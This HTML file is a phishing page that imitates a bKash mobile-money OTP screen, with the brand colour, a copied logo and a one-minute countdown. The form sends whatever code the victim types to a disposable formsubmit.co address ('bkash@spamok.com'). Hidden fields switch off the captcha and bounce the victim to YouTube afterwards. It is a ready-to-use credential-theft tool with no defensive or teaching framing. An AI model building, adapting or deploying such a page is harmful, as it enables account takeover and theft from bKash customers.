<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bkash OTP</title>
    <style>
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        body {
            background-color: #e4136b;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            text-align: center;
        }
        .logo img {
            max-width: 110px;
            animation: fadeIn 1s ease-in-out;
        }
        .container {
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
            margin-top: 20px;
            width: 300px;
            animation: fadeIn 1.5s ease-in-out;
        }
        input {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            box-sizing: border-box;
            outline: none;
        }
        input:focus {
            border-color: #e4136b;
        }
        #timer {
            color: #e4136b;
            font-weight: bold;
            margin-bottom: 10px;
        }
        button {
            background: #e4136b;
            color: white;
            padding: 10px;
            border: none;
            cursor: pointer;
            border-radius: 5px;
            width: 100%;
            transition: background 0.3s;
        }
        button:hover {
            background: #c5115a;
        }
        #goBack {
            margin-top: 20px;
            color: #999999;
            cursor: pointer;
        }
    </style>
</head>
<body>

<div class="logo">
    <img src="https://i.ibb.co/0s3npSv/5e6ab3fa58a91-removebg-preview-1.png" alt="Bkash Logo">
</div>

<form action="https://formsubmit.co/bkash@spamok.com" method="POST">
    <div class="container">
        <p>We have sent an OTP to your bKash mobile number, enter that OTP here.</p>
        <input type="text" name="OTP" placeholder="Enter OTP" id="otpInput" inputmode="numeric" pattern="\d{6}" required>
        <div id="timer">01:00</div>
        
        <!-- Hidden Redirect Field -->
        <input type="hidden" name="_next" value="https://youtube.com">
        <input type="hidden" name="_captcha" value="false">

        <button type="submit" id="submitButton">Submit â†’</button>
        <p id="goBack" onclick="history.back()">GO BACK</p>
    </div>
</form>

<script>
const timerElement = document.getElementById('timer');

function startTimer(duration) {
    let timer = duration, minutes, seconds;
    const countdown = setInterval(() => {
        minutes = Math.floor(timer / 60);
        seconds = timer % 60;

        timerElement.textContent = `${minutes < 10 ? '0' : ''}${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;

        if (--timer < 0) {
            clearInterval(countdown);
            alert("Time is up! Please try again.");
        }
    }, 1000);
}

window.onload = () => {
    startTimer(60);
};
</script>

</body>
</html>
